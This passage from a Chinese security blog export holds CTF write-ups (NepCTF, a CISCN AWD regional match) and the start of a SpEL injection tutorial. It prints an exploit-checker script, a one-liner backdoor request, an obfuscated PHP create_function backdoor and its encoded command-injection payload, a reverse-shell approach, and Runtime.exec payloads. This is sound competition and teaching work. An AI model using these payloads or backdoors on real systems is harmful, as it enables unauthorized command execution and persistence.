class="hljs-string">&#x27;charsets.zip&#x27;</span>)<br>        <span class="hljs-keyword">if</span> packageFileAsBytes <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">continue</span><br>        <br>        url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;target&#125;</span>:<span class="hljs-subst">&#123;port&#125;</span>/api/package/upload&quot;</span><br>        response, requestBody = uploadPackage(url, args.repoName, args.packageName, args.version, packageFileAsBytes)<br>        <br>        <span class="hljs-keyword">if</span> response <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">continue</span><br>        <br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">500</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;Package is expected to be unpacked, but it doesn&#x27;t exist&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Target <span class="hljs-subst">&#123;target&#125;</span> is vulnerable.&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Target <span class="hljs-subst">&#123;target&#125;</span> is not vulnerable.&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Status Code: <span class="hljs-subst">&#123;response.status_code&#125;</span>&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Response Body: <span class="hljs-subst">&#123;response.text&#125;</span>&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Request Body: <span class="hljs-subst">&#123;json.dumps(requestBody, indent=<span class="hljs-number">4</span>)&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Error analyzing response from <span class="hljs-subst">&#123;url&#125;</span>: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <br>    <span class="hljs-keyword">try</span>:<br>        os.remove(<span class="hljs-string">&#x27;charsets.zip&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Cleanup successful.&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Error cleaning up files: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>然后触发漏洞</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/api</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>neptune-46711.nepctf.lemonprefect.cn<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html;charset=GBK<br><br><br></code></pre></td></tr></table></figure><img src="/2024/08/26/2024NepCTF/8.jpg" class=""><h1 id="neprouper赛后"><a class="markdownIt-Anchor" href="#neprouper赛后"></a> Neprouper（赛后）</h1><h2 id="neprouter-狸猫换太子"><a class="markdownIt-Anchor" href="#neprouter-狸猫换太子"></a> NepRouter-狸猫换太子</h2><p>5000端口，注册一个用户，会发现不管填什么都会自动显示成TEST，然后注册的时候会发送一个encrypted_id是加密的内容，很明显是前端加密，所以可以将TEST在前端修改成自己设的，如admin，然后注册，进去之后可以下载一个ELF文件，点about_us会跳到8080端口，一个登录框</p><p>下下来放进ida分析</p><img src="/2024/08/26/2024NepCTF/9.jpg" class=""><p>经过测试可以发现这是8080登录的逻辑判断，需要用户是NepNepIStheBestTeam</p><p>所以在5000端口注册用户为NepNepIStheBestTeam，</p><img src="/2024/08/26/2024NepCTF/10.jpg" class=""><p>然后注册，再点about_us，以NepNepIStheBestTeam登录会跳转到路由配置中心</p><p>可以测试到输入ip的地方可以RCE，那就反弹个shell</p><p>有空格就没成功，所以用base64编码绕过</p><img src="/2024/08/26/2024NepCTF/11.jpg" class=""><img src="/2024/08/26/2024NepCTF/12.jpg" class=""><p>NepCTF{You_93t_Me_But_Now_just_start}</p><h2 id="neprouter-白给"><a class="markdownIt-Anchor" href="#neprouter-白给"></a> NepRouter-白给</h2><p>在反编译那里可以看到数据库看到账号密码，比赛时直接用Mysql命令连接。</p><p>赛后出题人说不行，他做了设置，需要用python或go写脚本连或者navicat连，然而写脚本和navicat试了都连不上。</p><img src="/2024/08/26/2024NepCTF/13.jpg" class=""><p>估计这题也有点无语。</p>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024ciscn华南分区赛</title>
    <link href="/2024/06/10/2024ciscn%E5%8D%8E%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9B/"/>
    <url>/2024/06/10/2024ciscn%E5%8D%8E%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<p>国赛华南分区赛——桂林之旅</p><p>拿了个二等奖，国赛就到这了，还是太菜了</p><p>除了前面利用ssh抢先拿了几个flag，然后利用后门收了一波，后面由于没有做权限维持，其他队伍又修了洞就开始掉分了，还好最后pwn手解出来了挽回一些分数冲了二等。由于环境出了问题，本来10点应该开始的比赛等到12点多才开始，而且比赛没有延时，也就是从6个小时变成了4个小时。题目web的java和pwn裁判说出题人权限没设好导致基本没办法fix，只能攻不能守。java题居然是初赛原题，可惜初赛java没来得及看，java很久才和本地打通，但这个时候已经被人搅屎了，全场的java主机ssh都被定时断开失联，导致java还没利用到就结束了。不过也让我们后面免受其他队的挨打，只受到一两个队的挨打。</p><p>这次的php题目是预留了两个后门，一个是一句话木马，一个是通过反射调用create_function来执行命令</p><p>访问后门的很简单，D盾就能扫出来，很多队都修了，剩下几个没修的</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/Home/</span>template<span class="hljs-regexp">/default/</span>adminpanel.php?backdoor=system(<span class="hljs-string">&quot;cat /flag.txt&quot;</span>);<br></code></pre></td></tr></table></figure><p>另一个后门就比较难发现，当时也是没发现，然后被人利用后种了不死马</p><p>赛后复现发现其实利用也很简单，当时要是仔细审代码也许能够发现这个后门，都把时间花在java上了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//去除报错</span><br><span class="hljs-comment">#error_reporting(0);</span><br><span class="hljs-comment">//设置超时</span><br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">300</span>);<br><span class="hljs-comment">//全局变量</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">go</span> </span>&#123;<br><br>    <span class="hljs-comment">//password</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span> = <span class="hljs-string">&quot;command&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkPass</span>())&#123;<br>            <span class="hljs-variable">$param</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">parser</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">getData</span>()-&gt;data);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$param</span>)&#123;<br>                <span class="hljs-variable">$instance</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TLKNQWFlogin</span>();<br>                <span class="hljs-variable">$reflectionClass</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionClass</span>(<span class="hljs-string">&#x27;TLKNQWFlogin&#x27;</span>);<br>                <span class="hljs-variable">$reflectionProperty</span> = <span class="hljs-variable">$reflectionClass</span>-&gt;<span class="hljs-title function_ invoke__">getProperty</span>(<span class="hljs-variable">$instance</span>-&gt;func);<br>                <span class="hljs-variable">$reflectionProperty</span>-&gt;<span class="hljs-title function_ invoke__">setAccessible</span>(<span class="hljs-literal">true</span>);<br>                <span class="hljs-variable">$command</span> = <span class="hljs-variable">$reflectionProperty</span>-&gt;<span class="hljs-title function_ invoke__">getValue</span>(<span class="hljs-variable">$instance</span>);<br>                <span class="hljs-variable">$reflectionMethod</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionFunction</span>(<span class="hljs-variable">$command</span>);<br>                <span class="hljs-variable">$result</span> = <span class="hljs-variable">$reflectionMethod</span>-&gt;<span class="hljs-title function_ invoke__">invoke</span>(<span class="hljs-variable">$param</span>,<span class="hljs-string">&quot;_&quot;</span>);<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;parser is wrong!&quot;</span>;<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;pass is wrong!&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">#检查key</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkPass</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-variable language_">$this</span>-&gt;pass]))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-comment">//获取请求数据</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getData</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;data = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-variable language_">$this</span>-&gt;pass];<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>;<br>    &#125;<br>    <span class="hljs-comment">// //解析参数加密</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parser</span>(<span class="hljs-params"><span class="hljs-variable">$param</span></span>)</span>&#123;<br>        <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$param</span>);<br>        <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$data</span>,<span class="hljs-number">0</span>,<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;pass));<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$key</span> == <span class="hljs-variable language_">$this</span>-&gt;pass)&#123;<br>            <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">substr_replace</span>(<span class="hljs-variable">$data</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;pass));<br>            <span class="hljs-variable language_">$this</span>-&gt;data = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$data</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$data</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">calc</span>(<span class="hljs-params"><span class="hljs-variable">$password</span>,<span class="hljs-variable">$func</span></span>)</span>&#123;<br>    <span class="hljs-variable">$functions</span> = <span class="hljs-variable">$func</span>(<span class="hljs-string">&#x27;$a&#x27;</span>, <span class="hljs-string">&quot;echo <span class="hljs-subst">$password</span>&quot;</span>);<br>    <span class="hljs-variable">$functions</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Command&quot;</span>;<br>    &#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TLKNQWFlogin</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$command</span>;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;command&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;command = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$param</span>,<span class="hljs-variable">$magic</span></span>) </span>&#123;  <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">calc</span>(<span class="hljs-variable">$param</span>.<span class="hljs-string">&#x27;exit();&#x27;</span>,<span class="hljs-string">&quot;create&quot;</span>.<span class="hljs-variable">$magic</span>.<span class="hljs-string">&quot;function&quot;</span>) ; &#125;;<br>        <br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">go</span>();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">run</span>();<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$command</span>=<span class="hljs-string">&quot;1;&#125;system(&#x27;whoami&#x27;);/*&quot;</span>;<br><span class="hljs-variable">$command</span>=<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$command</span>);<br><span class="hljs-variable">$str</span>=<span class="hljs-string">&quot;command&quot;</span>.<span class="hljs-variable">$command</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$str</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost<span class="hljs-regexp">/html/</span>A<span class="hljs-regexp">/t/</span>tpl<span class="hljs-regexp">/common/</span>Command.php?command=Y29tbWFuZE1UdDljM2x6ZEdWdEtDZDNhRzloYldrbktUc3ZLZz09<br></code></pre></td></tr></table></figure><p>这里直接访问是因为admin.php的路由里面写了<code>/A/t/tpl</code>下面是静态文件，</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>定义静态文件路径<br>define(<span class="hljs-string">&#x27;Tpl_style&#x27;</span>,<span class="hljs-string">&#x27;/A/t/tpl&#x27;</span>);<br></code></pre></td></tr></table></figure><p>静态文件是可以直接通过路径访问到的</p><p>此次比赛深刻教训：要去学学怎么种不死马维持权限， 不然只能拿到前面几轮的flag后面基本就只有挨打的份了。</p>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SpEL表达式注入</title>
    <link href="/2024/05/28/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/05/28/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h3 id="spel基础"><a class="markdownIt-Anchor" href="#spel基础"></a> SpEL基础</h3><p>Springboot3 开始引入了Spring表达式语言（Spring Expression Language，简称SpEL），可以与基于XML和基于注解的Spring配置还有bean定义一起使用。</p><p>Spring框架的核心功能之一就是通过依赖注入的方式来管理Bean之间的依赖关系，而SpEL可以方便快捷的对ApplicationContext中的Bean进行属性的装配和提取。由于它能够在运行时动态分配值，因此可以为我们节省大量Java代码。</p><p>Bean是指一个由Spring容器管理的对象。这个对象可以是任何一个Java类的实例。Bean的主要优势是可以将对象的创建和管理与业务逻辑分离。这使得应用程序更加灵活和易于维护。</p><p>SpEL有许多特性：</p><ul><li>使用Bean的ID来引用Bean</li><li>可调用方法和访问对象的属性</li><li>可对值进行算数、关系和逻辑运算</li><li>可使用正则表达式进行匹配</li><li>可进行集合操作</li></ul><h4 id="spel定界符"><a class="markdownIt-Anchor" href="#spel定界符"></a> SpEL定界符<code>#&#123;&#125;</code></h4><p>所有在大括号中的字符都将被认为是SpEL表达式，在其中可以使用SpEL运算符、变量、引用bean及其属性和方法等。</p><p><code>#&#123;&#125;</code>与<code>$&#123;&#125;</code>区别：</p><ul><li><code>#&#123;&#125;</code>就是SpEL的定界符，用于指明内容为SpEL表达式并执行；</li><li><code>$&#123;&#125;</code>主要用于加载<strong>外部属性</strong>文件中的值；</li><li>两者可以混合使用，但是必须<code>#&#123;&#125;</code>在外面，<code>$&#123;&#125;</code>在里面，如<code>#&#123;'$&#123;&#125;'&#125;</code>，注意单引号是字符串类型才添加的；</li></ul><h4 id="spel表达式类型"><a class="markdownIt-Anchor" href="#spel表达式类型"></a> SpEL表达式类型</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;property <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;message1&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;#&#123;666&#125;&quot;</span>/&gt; #给属性复制<br>&lt;property <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;message&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;the value is #&#123;666&#125;&quot;</span>/&gt; #和字符串混用<br>&lt;constructor-arg <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;#&#123;test&#125;&quot;</span>/&gt; #对bean进行引用，test的其他bean的id<br></code></pre></td></tr></table></figure><h4 id="引用类属性"><a class="markdownIt-Anchor" href="#引用类属性"></a> 引用类属性</h4><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;bean id<span class="hljs-operator">=</span><span class="hljs-string">&quot;carl&quot;</span> class<span class="hljs-operator">=</span><span class="hljs-string">&quot;com.spring.entity.Instrumentalist&quot;</span>&gt;<br>    &lt;property name<span class="hljs-operator">=</span><span class="hljs-string">&quot;instrument&quot;</span> value<span class="hljs-operator">=</span><span class="hljs-string">&quot;#&#123;kenny.instrument&#125;&quot;</span>/&gt;<br>    &lt;property name<span class="hljs-operator">=</span><span class="hljs-string">&quot;song&quot;</span> value<span class="hljs-operator">=</span><span class="hljs-string">&quot;#&#123;kenny.song&#125;&quot;</span>/&gt;<br>&lt;/bean&gt;<br></code></pre></td></tr></table></figure><h4 id="引用类方法"><a class="markdownIt-Anchor" href="#引用类方法"></a> 引用类方法</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;property <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;song&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;#&#123;SongSelector.selectSong()&#125;&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;property <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;song&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;#&#123;SongSelector.selectSong()?.toUpperCase()&#125;&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><p><code>?.</code>符号会确保左边的表达式不会为<code>null</code>，如果为<code>null</code>的话就不会调用<code>toUpperCase()</code>方法了，防止抛出<code>NullPointerException</code>错误</p><h4 id="类类型表达式"><a class="markdownIt-Anchor" href="#类类型表达式"></a> 类类型表达式</h4><p>在SpEL表达式中，使用<code>T(Type)</code>运算符会调用类的作用域和方法。</p><p>使用<code>T(Type)</code>来表示java.lang.Class实例，Type必须是类全限定名，但”java.lang”包除外，因为SpEL已经内置了该包，即该包下的类可以不指定具体的包名；</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;random&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;#</span></span></span><span class="hljs-template-variable">&#123;T(java.lang.<span class="hljs-keyword">Math</span>).random()&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>/&gt;</span></span><br></code></pre></td></tr></table></figure><p><strong>弹计算器</strong></p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;helloWorld&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.example.spel.HelloWorld&quot;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;message&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;#</span></span></span><span class="language-xquery">&#123;T(java<span class="hljs-built_in">.lang</span>.Runtime).getRuntime().exec(<span class="hljs-string">&#x27;calc&#x27;</span>)&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span> /&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h4 id="spel使用"><a class="markdownIt-Anchor" href="#spel使用"></a> SpEL使用</h4><p>可以使用SpEL的位置：</p><ul><li><p>注解@Value中</p><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EmailSender</span> &#123;<br>    <span class="hljs-meta">@Value(&quot;$&#123;spring.mail.username&#125;&quot;)</span><br>    <span class="hljs-keyword">private</span> String mailUsername;<br>    <span class="hljs-meta">@Value(&quot;#&#123; systemProperties[&#x27;user.region&#x27;] &#125;&quot;)</span>    <br>    <span class="hljs-keyword">private</span> String defaultLocale;<br>    <span class="hljs-comment">//...</span><br><br></code></pre></td></tr></table></figure></li><li><p>XML配置（如上面的Beans.xml）</p></li><li><p>代码块中使用Expression</p><p>SpEL 在求表达式值时一般分为四步，其中第三步可选：首先构造一个解析器，其次解析器解析字符串表达式，在此构造上下文，最后根据上下文得到表达式运算后的值。</p><p>例如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br><span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> parser.parseExpression(<span class="hljs-string">&quot;(&#x27;Hello&#x27; + &#x27; fru1ts&#x27;).concat(#end)&quot;</span>);<br><span class="hljs-type">EvaluationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardEvaluationContext</span>();<br>context.setVariable(<span class="hljs-string">&quot;end&quot;</span>, <span class="hljs-string">&quot;!&quot;</span>);<br>System.out.println(expression.getValue(context));<br></code></pre></td></tr></table></figure><p>Expression会将传入parseExpression()函数的字符串参数当初SpEL表达式来解析，而无需通过<code>#&#123;&#125;</code>符号来注明</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">spel</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;T(java.lang.Runtime).getRuntime().exec(\&quot;calc\&quot;)&quot;</span>;<br><span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br><span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> parser.parseExpression(spel);<br>System.out.println(expression.getValue());<br></code></pre></td></tr></table></figure></li></ul><h3 id="spel表达式注入漏洞"><a class="markdownIt-Anchor" href="#spel表达式注入漏洞"></a> SpEL表达式注入漏洞</h3><h4 id="漏洞原理"><a class="markdownIt-Anchor" href="#漏洞原理"></a> 漏洞原理</h4><ul><li>SimpleEvaluationContext ：仅支持SpEL语言语法的一个子集，不包括 Java类型引用、构造函数和bean引用</li><li>StandardEvaluationContext （默认）：支持全部SpEL语法</li></ul><p>SpEL表达式是可以操作类及其方法的，可以通过类类型表达式T(Type)来调用任意类方法。这是因为在不指定EvaluationContext的情况下默认采用的是StandardEvaluationContext，而它包含了SpEL的所有功能，在允许用户控制输入的情况下可以成功造成任意命令执行。</p><h4 id="探测"><a class="markdownIt-Anchor" href="#探测"></a> 探测</h4><ul><li>源码里面找类</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.expression</span><span class="hljs-selector-class">.Expression</span><br>org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.expression</span><span class="hljs-selector-class">.ExpressionParser</span><br>org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.expression</span><span class="hljs-selector-class">.spel</span><span class="hljs-selector-class">.standard</span>.SpelExpressionParser<br></code></pre></td></tr></table></figure><ul><li>找特征</li></ul><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">ExpressionParser parser = <span class="hljs-keyword">new</span> <span class="hljs-constructor">SpelExpressionParser()</span>;<br>Expression expression = parser.parse<span class="hljs-constructor">Expression(<span class="hljs-params">str</span>)</span>;<br>expression.get<span class="hljs-constructor">Value()</span><br>expression.set<span 